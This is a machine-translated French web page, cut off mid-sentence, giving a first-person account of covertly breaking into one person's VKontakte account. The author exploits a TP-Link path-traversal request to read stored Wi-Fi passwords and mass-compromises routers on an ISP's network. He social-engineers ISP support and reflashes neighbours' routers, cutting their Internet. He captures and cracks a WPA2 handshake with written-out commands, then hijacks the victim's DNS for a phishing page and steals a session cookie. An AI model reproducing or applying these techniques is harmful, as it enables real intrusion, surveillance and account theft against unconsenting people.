<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèø‚Äç‚öïÔ∏è üë©üèø‚Äçü§ù‚Äçüë©üèæ üç® Quelles vuln√©rabilit√©s des routeurs TP-LINK peuvent conduire √† üöµ üßúüèΩ ü•ò</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="En fait, cet article discutera non seulement des vuln√©rabilit√©s des routeurs TP-LINK, mais √©galement de la fa√ßon de cr√©er √† distance une station de pi...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Quelles vuln√©rabilit√©s des routeurs TP-LINK peuvent conduire √†</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/381573/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En fait, cet article discutera non seulement des vuln√©rabilit√©s des routeurs TP-LINK, mais √©galement de la fa√ßon de cr√©er √† distance une station de piratage √† partir de ces routeurs et de ce qui peut √™tre r√©alis√© avec cela. </font><font style="vertical-align: inherit;">Et aussi un peu sur la fa√ßon dont il a √©t√© appliqu√© pour acc√©der √† la page VKontakte. </font><font style="vertical-align: inherit;">Ceci est une sorte d'histoire d'un gros hack, qui comprend tout ce qui pr√©c√®de.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il m'a fallu une fois pour acc√©der √† la page VK d'une personne, tout en √©tant le plus invisible possible pour l'utilisateur, et j'ai commenc√© √† chercher des moyens. La premi√®re chose qui m'est venue √† l'esprit a √©t√© de laisser tomber le cheval de Troie √† la victime, car j'avais d√©j√† pr√©par√© un TightVNC cach√© avec une connexion arri√®re pour mon lecteur VLC IP + cach√©, qui transmet √©galement le son du microphone en temps r√©el √† mon IP. Cependant, il n'√©tait pas du tout d√©fini comme un malware sur VirusTotal. Mais l'article ne traite pas du tout de cela. En cons√©quence, j'ai r√©ussi √† obtenir le cheval de Troie, ainsi qu'√† acc√©der au VK (simplement en copiant les cookies du navigateur de la victime), mais bient√¥t le syst√®me d'exploitation a √©t√© r√©install√© sur l'ordinateur de l'utilisateur, et j'ai d√ª chercher un autre moyen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La seule chose que je savais, c'√©tait le fournisseur de la victime. Eh bien, j'ai commenc√© par scanner toute la gamme de ce fournisseur notoire de la ville N (pour des raisons √©videntes, je n'appellerai pas le fournisseur), et j'ai d√©couvert une chose merveilleuse: le port 8080 est ouvert sur la plupart des h√¥tes. Il est imm√©diatement devenu clair qu'il s'agit d'une interface Web routeur. J'esp√©rais d√©j√† un administrateur admin par d√©faut (alors cela aurait √©t√© un effondrement complet pour le fournisseur), mais non, je n'ai pas pu trouver le mot de passe, bien que j'aie encore trouv√© une douzaine de routeurs o√π se trouvait le mot de passe par d√©faut. Il s'est av√©r√© que 90% de tous les routeurs sont TP-Link TL-WR741ND et moins souvent 740N, 841N, 941ND.</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/geektimes/post_images/256/603/b26/256603b26f76e009b2a3bf2bae2abea9.jpg" alt="image"><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout est tr√®s clair ici: le fournisseur loue les m√™mes routeurs aux utilisateurs, les configure lors de l'installation et il est tout simplement trop paresseux pour les utilisateurs de modifier ces param√®tres. C'est devenu de plus en plus int√©ressant. Dans ce cas, il devrait s√ªrement y avoir un mod√®le dans le param√®tre, c'est-√†-dire que les mots de passe sont probablement les m√™mes. J'ai d√©cid√© de rechercher sur Google s'il y avait des vuln√©rabilit√©s dans ces mod√®les et, √† ma grande surprise √† ce moment-l√†, j'en ai trouv√© beaucoup. La premi√®re chose qui a attir√© mon attention a √©t√© l'article </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">¬´Backdoor dans les routeurs TP-LINK¬ª</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
J'ai imm√©diatement d√©cid√© de v√©rifier cette vuln√©rabilit√©. Des fichiers ont √©t√© t√©l√©charg√©s sur le routeur, mais il ne les a pas accept√©s, puis j'ai commenc√© √† r√©fl√©chir √† la raison d'√™tre de ce nart.out. Il s'agit d'un binaire MIPS, qui peut √™tre n'importe quelle application, il vous suffit de le cr√©er. Pour commencer, j'ai commenc√© √† chercher une version pr√™te √† l'emploi, car auparavant, je n'avais presque jamais eu √† faire de compilation crois√©e. √Ä ma grande surprise, juste √† ce moment, une autre personne s'est int√©ress√©e √† ce probl√®me: </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Specx2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (je recommande d'ailleurs de lire son </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">article</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sur la fa√ßon d'assembler une station de piratage √† partir d'un routeur, ce que, en fait, je n'ai finalement fait qu'√† distance). Il a r√©ussi √† trouver netcat compil√© sous MIPS dans l'un des forums chinois, soit dit en passant, exactement dans la section o√π cette vuln√©rabilit√© a √©t√© discut√©e. Ce binaire a √©t√© lanc√© avec succ√®s sous QEMU, vers√© avec succ√®s dans le routeur via la porte d√©rob√©e trouv√©e, mais, pour une raison quelconque, il n'√©tait pas possible de se connecter au routeur: il n'avait tout simplement pas de connexion. Le camarade Specx2 a </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sugg√©r√©</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> que le point peut √™tre que le port 2222 peut simplement √™tre ferm√©, et vous devez en quelque sorte faire fonctionner netcat sur un autre port.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous avons essay√© de compiler netcat pour MIPS nous-m√™mes, mais nous n'avons pas r√©ussi √† d√©finir l'option de port par d√©faut. Ensuite, nous avons utilis√© un d√©monteur, mais tout aussi sans succ√®s. Et puis j'ai d√©cid√© d'ouvrir ce binaire avec le Notepad ++ habituel, et, √† ma grande surprise, j'ai trouv√© le convoit√© 2222. Ce nombre pourrait facilement √™tre chang√© en n'importe quel autre, l'essentiel est que le nombre de caract√®res dans le fichier ne change pas. Le port a vraiment chang√©, tout a √©t√© test√© sur QEMU, mais nous n'avons toujours pas pu le faire fonctionner sur le routeur. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Je n'ai pas abandonn√© mes tentatives pour prendre le contr√¥le du routeur et j'ai commenc√© √† rechercher d'autres vuln√©rabilit√©s. Bient√¥t, je suis tomb√© sur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ce post</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Et en effet: sur les mod√®les 841 et 941, il y avait un obus √†</font></font><br>
<pre><code class="bash hljs">/userRpmNatDebugRpm26525557/linux_cmdline.html
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seulement ici, le mot de passe du routeur devait encore √™tre connu, et les utilisateurs de ce fournisseur avaient essentiellement 741 mod√®les. J'ai r√©ussi √† trouver un routeur avec un mot de passe par d√©faut et ce shell, bien que tr√®s tronqu√©. Ainsi, j'ai eu acc√®s au syst√®me de fichiers du routeur. Malheureusement, je n'ai rien trouv√© de valable et le shell n'a pas fonctionn√© correctement. Les d√©veloppeurs font-ils vraiment le d√©bogage? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cela semblait √™tre une impasse, pendant longtemps je n'ai eu aucun indice, mais quelque chose m'a dit qu'il y avait encore des vuln√©rabilit√©s. Et puis j'ai d√©couvert que le routeur ne filtre pas les demandes GET. C'est-√†-dire, par d√©faut, lorsque le mot de passe n'est pas entr√© correctement, la page / help s'ouvre, mais si, par exemple, nous faisons cette demande:</font></font><br>
<pre><code class="bash hljs">GET IP:port/<span class="hljs-built_in">help</span>/../../
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ensuite, nous arriverons √† la racine du syst√®me de fichiers du routeur. Ainsi, nous pouvons t√©l√©charger presque tous les fichiers du routeur FS sans m√™me conna√Ætre le mot de passe. Cela s'est av√©r√© √™tre la premi√®re vuln√©rabilit√© fonctionnant avec succ√®s de tout ce que j'ai trouv√©. Mais qu'est-ce que cela nous donne si nous ne pouvons t√©l√©charger que des fichiers et ne savons pas o√π le mot de passe est stock√©? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Apr√®s une courte recherche, j'ai quand m√™me r√©ussi √† trouver un fichier int√©ressant dans /tmp/ath0.ap_bss, qui stocke le mot de passe pour le Wi-Fi sous une forme claire. J'ai imm√©diatement d√©cid√© de le v√©rifier sur l'un des routeurs des utilisateurs de ce fournisseur.</font></font><br>
<pre><code class="bash hljs">GET IP:8080/<span class="hljs-built_in">help</span>/../../tmp/ath0.ap_bss
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il s'est av√©r√© que les gens y travaillent assez paresseux et mettent les m√™mes mots de passe sur l'interface Web du routeur et du Wi-Fi, donc lorsque nous apprenons le mot de passe Wi-Fi en utilisant cette vuln√©rabilit√©, nous reconna√Ætrons automatiquement le mot de passe √† partir de l'interface Web. Il s'agit g√©n√©ralement de 8 chiffres. Plus rarement, les chiffres avec des lettres. Encore une fois, 8. √Ä partir de maintenant, je pouvais acc√©der au routeur de presque tous les utilisateurs qui n'avaient pas chang√© le mot de passe d√©fini par le fournisseur, et pratiquement personne ne l'avait chang√©. Certes, certains routeurs disposaient toujours de la derni√®re version du micrologiciel, et cette vuln√©rabilit√© ne fonctionnait pas, mais il n'y en avait pas beaucoup. Imm√©diatement, j'ai d√©couvert un autre point int√©ressant. Le SSID de tous les points contenait la seconde moiti√© de l'adresse IP interne de l'utilisateur, et la premi√®re √©tait la m√™me pour tous. Il s'est av√©r√© la m√™me chose que dans le compte personnel sur le site, le mot de passe √©tait le m√™me.Et cette seconde moiti√© de l'IP interne √©tait le num√©ro de contrat. Autrement dit, par le num√©ro de l'accord utilisateur, il √©tait possible de calculer l'IP interne.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Malgr√© le fait que tous les utilisateurs avaient une v√©ritable IP externe (bien que dynamique), j'ai d√©cid√© de monter un serveur VPN sur plusieurs des routeurs ASUS, o√π il y avait un mot de passe par d√©faut. Heureusement, cette fonctionnalit√© a √©t√© int√©gr√©e au firmware par d√©faut. Ainsi, j'ai eu acc√®s au r√©seau interne du fournisseur.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais avant de pirater le VK √©tait encore loin. Je ne connaissais m√™me pas la victime IP. Ni externe ni interne. Il existe de nombreuses fa√ßons de trouver l'adresse IP externe, et je l'ai fait. Eh bien, commen√ßons √† √©tudier. Tout d'abord, il a r√©pondu aux requ√™tes ping, ce qui est d√©j√† bien. Deuxi√®mement, je savais que la victime avait √©galement un routeur (cela peut √©galement √™tre compris par TTL, car la grande majorit√© des utilisateurs ont Windows install√©, et le TTL par d√©faut de Windows est 128), avec le m√™me mod√®le. Mais, √† mon grand regret, tous les ports de la victime ont √©t√© ferm√©s et il n'y avait pas d'acc√®s au webmord depuis l'ext√©rieur. Mais je savais que dans tous les cas, c'est via LAN, mais pour cela, nous devons nous connecter √† ce routeur via une interface sans fil, ainsi que r√©cup√©rer le mot de passe pour le panneau d'administration, ce qui serait tr√®s probl√©matique, car je ne pouvais pas le trouver √† ce moment-l√† o√π il est stock√©. M√™me si maintenant je sais d√©j√†dans quoi est-il stock√©</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/ dev / mtdblock3</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , mais ce bloc n'est pas mont√©, il est donc impossible de le lire √† travers la vuln√©rabilit√© d√©crite. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
J'ai √©galement appris que la connexion depuis la connexion VPN pour acc√©der √† Internet correspond aux initiales et au nom de famille de l'utilisateur ou d'une partie de celui-ci, et que le mot de passe est le m√™me. J'ai commenc√© √† r√©fl√©chir, comment puis-je trouver l'utilisateur dont j'ai besoin? Peut-√™tre que j'ai encore fait l'erreur de d√©finir l'IP √† ce moment-l√†, et qu'elle a d√©j√† r√©ussi √† changer pendant que j'essayais de me connecter au webmord? La premi√®re chose qui m'est venue √† l'esprit √©tait une simple √©num√©ration de tous les routeurs. Mais le nombre d'abonn√©s chez le fournisseur est assez important. Apr√®s avoir scann√© toute la gamme, j'ai trouv√© environ 3 000 routeurs avec acc√®s √† distance √† l'interface Web. Et il fallait en quelque sorte trouver parmi eux le bon, le cas √©ch√©ant.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout d'abord, j'ai essay√© d'√©crire un script qui reconna√Ætrait le mot de passe √† l'aide de la vuln√©rabilit√© trouv√©e, puis je t√©l√©chargerais la page de configuration du r√©seau et l'enregistrerais. Mais je suis faible dans ce domaine, et, apr√®s avoir rejet√© cette id√©e apr√®s un certain temps, j'ai d√©cid√© d'utiliser un clicker ordinaire. Avec un chagrin en deux, j'ai (ou plut√¥t, le clicker) trait√© toute la gamme. Ensuite, j'ai recherch√© les fichiers de param√®tres (en esp√©rant trouver la victime par son nom de famille dans la connexion √† partir de la connexion vpn), mais je n'ai rien trouv√© dont j'avais besoin.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
J'ai commenc√© √† creuser plus loin et j'ai d√©couvert que tout routeur pirat√© peut scanner les points d'acc√®s qui l'entourent via une interface Web. J'ai donc eu une id√©e folle: casser le voisin de la victime avec cette vuln√©rabilit√©, afin qu'avec son routeur je puisse essayer de casser le mot de passe Wi-Fi de la victime et entrer dans l'interface Web via le LAN, tant que je parcours quelques milliers de kilom√®tres sans confiance en le succ√®s √©tait d√©raisonnable et il n'y avait tout simplement aucune possibilit√©. Mais mettre en ≈ìuvre ce qui avait √©t√© con√ßu √† l'√©poque semblait impensable. Comment trouver un voisin?</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Rappelez-vous que la deuxi√®me partie de l'IP interne est contenue dans le SSID. Il co√Øncide avec le num√©ro du contrat. Ce serait bien de conna√Ætre le SSID du point d'acc√®s de l'utilisateur afin que vous puissiez le trouver. Ce que j'ai fait? Oui, je viens de le prendre et j'ai √©crit au support technique du fournisseur, me pr√©sentant en tant qu'utilisateur, soi-disant je veux payer pour Internet, mais j'ai oubli√© le num√©ro de contrat. Et j'ai instantan√©ment re√ßu une r√©ponse, car je connaissais le nom et l'adresse. Ainsi, j'ai reconnu l'IP interne de la victime, qui est d'ailleurs statique (il est donc inutile de calculer constamment la dynamique externe, car il y a acc√®s au r√©seau interne via VPN sur l'un des routeurs pirat√©s). J'ai √©galement obtenu le SSID estim√© de cet utilisateur, donc j'avais d√©j√† quelque chose √† travailler.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La t√¢che √©tait d'aller dans tous les routeurs d'affil√©e et l'un d'entre eux pour trouver un routeur avec le SSID convoit√© dans le district. Encore une fois, la t√¢che n'a pas √©t√© facile, mais n'oubliez pas que nous avons acc√®s √† votre compte personnel, o√π l'adresse de la r√©sidence de l'utilisateur est indiqu√©e. Apr√®s avoir men√© plusieurs exp√©riences, je me suis rendu compte qu'il existe un certain sch√©ma entre l'adresse IP interne et l'adresse utilisateur. Autrement dit, il n'est pas n√©cessaire que les voisins soient sur le m√™me sous-r√©seau, mais au moins dans les voisins, par exemple: 10.168.155.0 et 10.168.158.0. Alors, trouvant l'utilisateur vivant pr√®s de la victime par la m√©thode du piquant scientifique, j'ai commenc√© √† trier tous les routeurs des sous-r√©seaux voisins. En cons√©quence, je n'ai pas trouv√© le SSID convoit√©, mais j'ai trouv√© 2 voisins apr√®s avoir vu leur adresse dans mon compte. Ma t√™te a explos√©: comment est-ce possible, j'ai trouv√© des voisins, mais je n'ai pas le bon point d'acc√®s √† proximit√©. Pourtant, elle √©tait, juste avec un SSID chang√©,et j'ai devin√© lequel. Cela s'est av√©r√© facile.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bien! Le routeur a √©t√© trouv√©, comme ses voisins, apr√®s avoir pass√© beaucoup de temps √† ce sujet. Et ensuite? Nous devons en quelque sorte obtenir le mot de passe du r√©seau sans fil, mais pour cela, nous devons soit intercepter la poign√©e de main et r√©cup√©rer le mot de passe (la protection est WPA2-PSK), soit r√©cup√©rer le code PIN WPS, car WPS est activ√© par d√©faut, mais sur la plupart des routeurs, il bloqu√© apr√®s 10 tentatives non valides. Comment pouvons-nous m√™me mettre en ≈ìuvre au moins une partie de cela? En effet, sur les routeurs des voisins il n'y a pas de logiciel sp√©cialis√©. Et puis l'id√©e est venue de reflasher leurs routeurs OpenWRT, parce que ce firmware est le plus proche du vrai Linux, et il y a aussi aircrack-ng, reaver et beaucoup d'autres packages pour cela. Camarade </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Specx2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">m√™me Bully s'est rassembl√© en dessous. Il n'y avait qu'un seul probl√®me: comment reflasher le routeur √† distance et ne pas y perdre l'acc√®s? Apr√®s tout, apr√®s avoir clignot√©, tous les param√®tres sont r√©initialis√©s par d√©faut. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
J'ai √©t√© tourment√© par ce probl√®me pendant longtemps, j'ai pens√© qu'il √©tait n√©cessaire de collecter tous les microprogrammes √† partir de z√©ro √† partir de la source et de pr√©-piloter les param√®tres l√†-bas, mais tout s'est av√©r√© beaucoup plus simple. Je ne connaissais m√™me pas l'existence d' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpenWRT Image Builder</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Je l'ai compris assez rapidement, mais j'ai d√ª choisir le bon ensemble de packages, car le volume du firmware ne peut pas d√©passer 4 Mo, et c'est petit, √©tant donn√© que beaucoup tra√Ænent sur une grande liste de d√©pendances. </font><font style="vertical-align: inherit;">Le probl√®me suivant √©tait que l'utilisateur n'avait acc√®s √† Internet qu'apr√®s avoir √©tabli une connexion VPN avec le serveur du fournisseur, mais ensuite tout le trafic √©tait entr√© dans le tunnel et j'ai perdu le contact avec le routeur. </font><font style="vertical-align: inherit;">Alors, que mon voisin me pardonne, je l'ai laiss√© sans Internet. </font><font style="vertical-align: inherit;">Apr√®s avoir flash√© avec succ√®s son routeur (apr√®s avoir laiss√© quelques dizaines d'utilisateurs sans Internet au cours d'exp√©riences infructueuses), j'ai imm√©diatement transf√©r√© la carte r√©seau du routeur en </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mode moniteur</font></font></b><br>
<pre><code class="bash hljs">ifconfig wlan0 down<font></font>
iw reg <span class="hljs-built_in">set</span> BO<font></font>
iwconfig wlan0 txpower 27<font></font>
airmon-ng start wlan0<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et lanc√© </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">airodump-ng</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<pre><code class="bash hljs">airodump-ng mon0 ‚Äìc _ ‚Äìbssid MAC__ ‚Äìw /tmp/123
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Intercepter une poign√©e de main n'a pas √©t√© difficile. </font><font style="vertical-align: inherit;">J'ai imm√©diatement t√©l√©charg√© le vidage du routeur √† l'aide de </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SCP</font></font></b><br>
<pre><code class="bash hljs">scp ‚ÄìP port user@host:/tmp/123-01.cap ~/123.cap
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Filtr√© √† partir de paquets inutiles dans Wireshark:</font></font><br>
<pre><code class="bash hljs">wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x04 || eapol
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">converti</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> au format .hccap pour Hashcat. </font><font style="vertical-align: inherit;">J'ai pr√©par√© un petit dictionnaire √† l'avance, ce qui m'a aid√© √† casser de nombreux r√©seaux sans fil, et j'ai √©galement ajout√© tous les mots de passe possibles pouvant √™tre utilis√©s par cet utilisateur.</font></font><br>
<pre><code class="bash hljs">oclHashcat64.exe ‚Äìm2500 ‚Äìa0 123.hccap wordlist.txt
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Heureusement, apr√®s quelques secondes, le mot de passe a √©t√© trouv√©! </font><font style="vertical-align: inherit;">Mais vous deviez tout de m√™me vous connecter au routeur en mode client! </font><font style="vertical-align: inherit;">Ce n'est qu'√† ce moment-l√† que le WAN du routeur du voisin changera √† nouveau, et j'y perdrai l'acc√®s. </font><font style="vertical-align: inherit;">Je ne pouvais toujours pas comprendre comment r√©soudre ce probl√®me, j'ai donc d√ª demander √† une personne de faire un sacrifice, de se connecter √† partir du t√©l√©phone et d'ouvrir l'acc√®s √† distance (maintenant je peux supposer que vous deviez simplement ajouter des routes statiques au firmware √† l'avance). </font><font style="vertical-align: inherit;">Heureusement, le mot de passe de l'interface Web s'est av√©r√© √™tre l'administrateur par d√©faut.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout s'est bien pass√©! J'ai d√©j√† pr√©par√© un nouveau plan d'action. Sur ma v√©ritable IP sans filtrage, j'ai √©lev√© le serveur DNS, o√π j'ai chang√© l'entr√©e pour vk.com et l'ai chang√© en mon IP, o√π le serveur HTTP avec PHP a √©galement √©t√© √©lev√©. L√†, en cons√©quence, le faux a √©t√© rempli avec la page d'autorisation vk.com, et dans le routeur, le serveur DNS a √©t√© chang√© pour le mien. Un utilisateur, se connectant √† vk.com, a pris mon faux, et donc le mot de passe √©tait le mien, l'objectif a √©t√© atteint!</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pendant longtemps, j'ai utilis√© cette m√©thode pour obtenir un mot de passe, mais une fois la confirmation de connexion vant√©e sur vk.com activ√©e, ce qui, selon les cr√©ateurs eux-m√™mes, est presque impossible √† contourner. En fin de compte, lorsque vous autorisez √† partir d'un nouvel appareil / navigateur, si vous entrez le mot de passe correct, vous devez √©galement saisir le code SMS, qui est envoy√© au num√©ro du propri√©taire. Mais pour ce cas, j'ai longtemps pr√©par√© une th√©orie qui n'a pas encore √©t√© test√©e.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout d'abord, j'ai essay√© de comprendre comment le serveur d√©termine que l'entr√©e provient d'un nouveau p√©riph√©rique. Tout s'est av√©r√© assez simple: un nouveau cookie est ajout√© au navigateur (si ma m√©moire est bonne, il s'appelle remixttpid), qui n'est transmis que via une connexion crypt√©e. Et par lui, le serveur d√©termine d√©j√† le navigateur √† partir duquel la connexion est autoris√©e. Si je ne me trompe pas, l'agent utilisateur doit √©galement correspondre. Ainsi, il nous suffit d'intercepter ce cookie pour vous connecter avec succ√®s avec un mot de passe connu, mais c'est assez difficile √† faire: nous devons faire passer le trafic utilisateur via mitmproxy, afin qu'il se connecte √©galement √† ce moment. De plus, l'utilisateur remarquera un avertissement du navigateur concernant une incompatibilit√© de certificat. Pourquoi √™tre si perverti, je pensaissi vous pouvez simplement intercepter une session existante? Apr√®s tout, une v√©rification du navigateur n'est effectu√©e qu'au moment de la connexion, mais n'est pas effectu√©e pour les demandes d'une session existante! Par cons√©quent, nous avons juste besoin d'intercepter</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">remixsid</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , qui, en outre, est transmis via une connexion non s√©curis√©e, car l'utilisateur n'utilise pas https. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le probl√®me √©tait seulement que </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">remixsid</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">il correspond √† l'IP de l'utilisateur, et s'il change, des cookies pour login.vk.com sont √©galement utilis√©s, qui sont transmis uniquement via une connexion crypt√©e, et il est plus difficile de les intercepter. Mais j'ai eu de la chance. √Ä ce moment-l√†, le fournisseur a commenc√© √† fournir un acc√®s √† Internet sans avoir besoin d'√©tablir une connexion VPN, ce qui signifie que je pouvais simplement augmenter mon serveur PPTP et √©tablir une connexion avec lui dans les param√®tres du routeur de l'utilisateur. Alors je l'ai fait, tout le trafic est pass√© par moi, et l'utilisateur, sans le savoir, a cr√©√© une session attach√©e √† mon IP, qui a √©t√© intercept√©e sans aucun probl√®me. Ensuite, je viens de retourner les param√®tres pr√©c√©dents et d'utiliser la session intercept√©e (l'avantage de l'IP est statique). La protection SMS est rompue avec succ√®s!</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout irait bien, mais je ne me suis pas arr√™t√© l√†. Le fait est que si l'utilisateur comprend soudainement le probl√®me, il peut simplement changer le mot de passe √† partir des param√®tres du routeur et du Wi-Fi. Pour √©viter cela, j'ai commenc√© √† cr√©er OpenWRT sous un routeur utilisateur. Il fallait tout pr√©voir. Pour une surveillance pratique du trafic des victimes, j'ai mont√© le serveur FTP en tant que syst√®me de fichiers √† l'aide de curlftpfs. Les vidages y sont √©crits. L'ensemble de ce processus est d√©crit dans cet </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">article</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Au d√©part, j'avais pr√©vu de monter le cloud comme un syst√®me de fichiers, pour lequel j'ai utilis√© </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">davfs2</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , qui n'√©tait pas non plus facile </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">√† construire sous OpenWRT</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, mais le probl√®me √©tait que le fichier a d'abord √©t√© √©crit dans le cache, puis seulement vers√© dans le cloud. </font><font 